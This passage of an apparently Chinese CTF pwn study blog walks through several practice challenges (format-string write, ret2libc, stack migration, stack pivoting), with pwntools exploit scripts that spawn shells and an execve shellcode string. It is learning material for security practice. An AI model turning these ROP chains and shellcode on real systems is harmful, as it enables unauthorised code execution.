class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27020&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>x_addr=<span class="hljs-number">0x0804A02C</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># payload=b&quot;aaaa%12$n&quot; + p32(x_addr)</span><br>payload=<span class="hljs-string">b&quot;%4c%13$n&quot;</span> + p32(x_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>要先试出来printf第一个可打印参数的位置，方式为：<br><img src="/images/20250820112254.png"><br>可以看到aaaa再次被打印的位置为第11个%p，所以第一个参数的位置是11，然后要往<code>x_addr</code>里写，<code>x_addr</code>是第13个参数。<br>用<code>%n</code>，写入内容为已打印字符的个数。</p><p>可以看到代码中我注释掉了一个payload，我刚开始用的就是第一个payload，直接打出4个a来表示x长度，但是没打通，然后调了一下，确定x的值是在下面的内容中被更改了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0xf7db3ab4 &lt;<span class="hljs-built_in">printf</span>+36&gt;    call   __vfprintf_internal         &lt;__vfprintf_internal&gt;<br></code></pre></td></tr></table></figure><p>里面具体发生了什么？<br>一步一步调，发现是这个函数触发了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">printf_positional<br></code></pre></td></tr></table></figure><p><img src="/images/20250820150937.png"><br>这里有很多次循环，每次循环对<code>ebx</code>+1，然后对<code>edi</code>作处理<br><img src="/images/20250820151143.png"><br>当ebx循环到13的时候，循环应该是结束了，然后开始一系列奇怪的操作（我没看懂XD），紧接着突然有一步：<br><img src="/images/20250820151654.png"><br>可以看到给x赋值这步出现了，现在需要重新来看仔细看一下在这之前都发生了什么。进入<code>printf_positional</code>后，给<code>*printf_positional+859</code>打断点，可以看到确实是循环，直到<code>ebx=13</code>为止，看上去很像我们传入的<code>payload = b&quot;%4c%13$n&quot; + p32(x_addr)</code>，给第13个参数赋值。<br><img src="/images/20250820152359.png"><br>粘出上面这张图是因为我发现这张图我能看懂（bushi<br>eax左移四位，然后去eax+ecx地址处的值存入eax，发现ecx+eax不就是刚开始<code>printf</code>栈上第13个参数吗（给x赋值为3的）<br><img src="/images/20250820152641.png"><br>然后就在这里水灵灵的给x赋值了（bushi，我怎么没注意到栈里啥时候多了个4啊，<code>ebp+0x10</code>的值什么时候变成4了）</p><p>找到了一篇比较好的文章描述<a href="https://bbs.kanxue.com/thread-285054.htm#msg_header_h2_1">printf</a>函数的内部机制</p><p>libc 是&#x3D;&#x3D;GNU C Library&#x3D;&#x3D;的缩写，是GNU 发布的C 标准库，也是Linux 系统中最常用的C 语言运行时库(runtime library)。它为开发人员提供了大量的API，包括系统调用封装和标准C 库函数，是许多程序运行的基础。</p><p>GLibC通过<code>ldbl_strong_alias</code>将<code>printf</code>设置成了<code>__printf</code>的别名。</p><p><code>ldbl_strong_alias</code>的实现依托于GCC的<code>__attribute__</code>和<code>alias</code>关键字实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _strong_alias(name, aliasname) \</span><br><span class="hljs-meta">    extern __typeof (name) aliasname __attribute__ ((alias (#name))) __attribute_copy__ (name);</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> strong_alias(name, aliasname) _strong_alias(name, aliasname)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ldbl_strong_alias(name, aliasname) strong_alias (name, aliasname)</span><br></code></pre></td></tr></table></figure><p>看下<code>__printf</code>的定义，其中有我们之前碰到的<code>__vfprintf_internal</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>__printf (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)<br>&#123;<br>  va_list arg;<br>  <span class="hljs-type">int</span> done;<br>  va_start (arg, format);<br>  done = __vfprintf_internal (<span class="hljs-built_in">stdout</span>, format, arg, <span class="hljs-number">0</span>);<br>  va_end (arg);<br>  <span class="hljs-keyword">return</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就都对上了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">vfprintf</span><br>    -&gt; printf_positional<br>        -&gt; va_arg<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>64位，动态链接，checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>什么保护都没开，鉴定为简单ROP（笑）<br>没有后门函数以及<code>system</code>这些，还要<code>libc</code>泄漏XD </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:28760&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x0000000000400733</span><br>vuln = <span class="hljs-number">0x000000000040067D</span><br><br><span class="hljs-comment">#-----泄露 libc-----#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)<br>p.sendline(payload)<br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>read_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;read_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)<br>libc = puts_addr - <span class="hljs-number">0x6f690</span><br>system = libc + <span class="hljs-number">0x45390</span><br>bin_sh = libc + <span class="hljs-number">0x18cd57</span><br><br><span class="hljs-comment">#-----ROP-----#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>第一次五分钟秒了一道泄露<code>libc</code>的题目，记录一下</p><h1 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h1><p>64位动态链接程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>什么保护也没开。然后有<code>read</code>的栈溢出，并且有后门函数<code>good_game</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27592&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;message:\n&#x27;</span>)<br>good_game = <span class="hljs-number">0x400620</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x88</span> + p64(good_game)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>^3e2b39</p><p>32位动态链接，也是什么保护都没开</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>ROP到函数hack。好吧被耍了（笑）。应该是格式化字符串漏洞，想办法改掉system(“”)里面的内容为<code>/bin/sh</code>。覆盖任意地址为字符串？（）这该怎么改<br>不会做，看了下wp的思路，原来是<code>ret2text</code>+<code>stack_migration</code>。又接触到新的知识了orz，看一下栈迁移怎么做吧～</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26066&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>hack = <span class="hljs-number">0x0804854B</span><br>command = <span class="hljs-number">0x080486C0</span><br>leave_ret = <span class="hljs-number">0x08048562</span><br>system_addr = <span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>p.recvline()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x27</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>ebp = u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;old_ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ebp)&#125;</span>&quot;</span>)<br>s = ebp-<span class="hljs-number">0x38</span><br>bin_sh = s + <span class="hljs-number">0x10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(bin_sh) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload = payload+ p32(s) + p32(leave_ret)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>第一遍<code>read</code>覆盖掉<code>old_ebp</code>之前的所有栈空间，使得<code>printf</code>的时候可以将<code>old_ebp</code>的值也打印出来，再根据调试计算出<code>old_ebp</code>和<code>s</code>之间的地址偏移。然后就能够在第二次<code>read</code>前得到<code>s</code>的地址。用<code>s</code>的地址覆盖原<code>old_ebp</code>的位置，通过为了栈迁移，将<code>return_addr</code>覆盖为<code>leave_ret</code>的地址。这样就会执行两次<code>leave; ret</code>，<code>leave</code>相当于<code>mov ebp, esp; pop ebp</code>。<code>ret</code>弹出当前栈帧到<code>eip</code>以执行，即：<code>pop eip</code></p><p>两次<code>leave; ret</code>实现了<code>esp</code>和<code>ebp</code>的控制 -&gt; 控制栈的位置，并且我们能够提前布置栈。</p><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64位动态链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>只开了NX</p><p><img src="/images/20250821093547.png"></p><p>可以看到会将写的最后一个字符给改为0，如果只ROP到<code>return addr</code>，会改掉，多打一个字符就行(猜测)，同样要<code>libc</code>泄漏</p><p>程序里面没有<code>puts</code>，有<code>printf</code>。做到这里发现对栈溢出的操作了解还是太少了，于是做个[总结]吧</p><p>利用<code>printf</code>作泄漏，构造<code>printf(&quot;%s&quot;, got[read])</code></p><p>问题是<code>%s</code>从哪里搞？实在没有办法只能自己往栈上写，然后想办法搞到写的位置的地址，类似的方式在[[pwn(2025.8.20)#^3e2b39|ciscn_2019_es_2]]遇到过。但是这里实际上是有<code>%s</code>的，题目中有已经存在的<code>printf</code>里面有，直接用。泄露完基地址直接打就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br><span class="hljs-comment"># context.log_level=&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27572&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> x, a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi_ret = <span class="hljs-number">0x400733</span><br>main = <span class="hljs-number">0x400636</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x400731</span><br>printf = <span class="hljs-number">0x4004F0</span><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>s = <span class="hljs-number">0x400770</span><br>main = <span class="hljs-number">0x400636</span><br><br><span class="hljs-comment"># dbg(&quot;b read&quot;)</span><br>ru(<span class="hljs-string">b&#x27;name?&#x27;</span>)<br>payload = <span class="hljs-number">0x27</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> + p64(pop_rdi_ret) + p64(s) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="hljs-number">0x0</span>) + p64(printf) + p64(main) + <span class="hljs-string">b&#x27;a&#x27;</span><br>sd(payload)<br>ru(<span class="hljs-string">b&#x27;!&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;again, &#x27;</span>)<br>read_addr = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;read_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)<br>libc_addr = read_addr - <span class="hljs-number">0xf7250</span><br>system = libc_addr + <span class="hljs-number">0x45390</span><br>bin_sh = libc_addr + <span class="hljs-number">0x18cd57</span><br>ru(<span class="hljs-string">b&#x27;name? &#x27;</span>)<br>payload = <span class="hljs-number">0x27</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + <span class="hljs-string">b&#x27;a&#x27;</span><br>sd(payload)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><h1 id="X-CTF-Quals-2016-b0verfl0w-Stack-Pivoting"><a href="#X-CTF-Quals-2016-b0verfl0w-Stack-Pivoting" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w [Stack Pivoting]"></a>X-CTF Quals 2016 - b0verfl0w [Stack Pivoting]</h1><p>^f9bd12</p><p>32位动态链接程序：<br><img src="/images/20250821114711.png"><br>溢出长度只有0x10字节，不够放一般的<code>shellcode</code>，所以考虑将shellcode写到栈上，然后利用一些方式做栈迁移。这道题中有一个<code>gadget</code>为：<code>jmp esp</code>，所以可以想办法修改<code>esp</code>使得<code>esp</code>指向<code>shellcode</code>所在的位置。但是<code>shellcode</code>所在位置为<code>return_addr - 0x24</code>，所以将返回地址先改为<code>jmp esp</code>，然后下一个栈帧改为<code>sub esp, 0x28; jmp esp</code>，就能够跳到<code>s</code>的位置，即我们输入<code>shellcode</code>的地方。</p><p>常见的<code>shellcode</code>可以在<a href="https://shell-storm.org/shellcode/index.html">这里</a>寻找</p><p>最后的代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>Local = <span class="hljs-literal">True</span><br><span class="hljs-comment"># Local = False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26066&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./ret2reg&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br><br>rl = <span class="hljs-keyword">lambda</span> x, a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span>: gdb.attach(p)<br><br><br>jmp_esp = <span class="hljs-number">0x08048504</span><br>sub_esp_jmp = <span class="hljs-string">b&#x27;\x83\xec(\xff\xe4&#x27;</span><br>shell_code = <span class="hljs-string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span 